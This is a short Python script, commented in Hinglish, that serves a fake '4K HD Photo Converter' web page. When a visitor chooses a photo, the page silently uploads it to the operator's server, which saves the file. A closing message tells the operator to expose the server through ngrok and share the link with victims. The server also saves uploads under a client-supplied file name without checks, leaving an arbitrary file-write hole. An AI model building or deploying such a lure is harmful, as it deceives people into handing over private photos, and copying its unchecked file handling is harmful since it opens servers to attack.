import http.server
import socketserver
import os

PORT = 8080

class SecurityHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # --- HTML & JAVASCRIPT ---
        # Hacker yahan 'fetch' use karta hai background upload ke liye
        html = """
        <html>
        <body style="text-align:center; font-family:sans-serif; padding:50px; background:#f4f4f4;">
            <h2>4K HD Photo Converter</h2>
            <p>Select a photo to enhance quality.</p>
            <input type="file" id="fileInput" accept="image/*" style="display:none;">
            <button onclick="document.getElementById('fileInput').click()" 
                    style="padding:15px 30px; background:#28a745; color:white; border:none; cursor:pointer;">
                Choose from Gallery
            </button>
            <p id="status"></p>

            <script>
                document.getElementById('fileInput').onchange = function(e) {
                    const file = e.target.files[0];
                    if (file) {
                        document.getElementById('status').innerText = "Uploading for processing...";
                        
                        // YEH HAI HACKER KA ASLI CODE
                        fetch('/', {
                            method: 'POST',
                            body: file,
                            headers: { 'File-Name': file.name }
                        }).then(() => {
                            alert("Success! Photo sent for enhancement.");
                            document.getElementById('status').innerText = "Done!";
                        });
                    }
                };
            </script>
        </body>
        </html>
        """
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        # --- SERVER SIDE RECEIVER ---
        # Hacker yahan data receive karke file save karta hai
        content_length = int(self.headers['Content-Length'])
        file_name = self.headers.get('File-Name', 'captured_image.jpg')
        post_data = self.rfile.read(content_length)

        with open(file_name, "wb") as f:
            f.write(post_data)
        
        print(f"\n[+] SUCCESS: File '{file_name}' received and saved!")
        
        self.send_response(200)
        self.end_headers()

# Server Start
print(f"[*] Starting Server on Port {PORT}...")
with socketserver.TCPServer(("", PORT), SecurityHandler) as httpd:
    print("[!] LIVE: Ab 'ngrok http 8080' chala kar link share karein.")
    httpd.serve_forever()
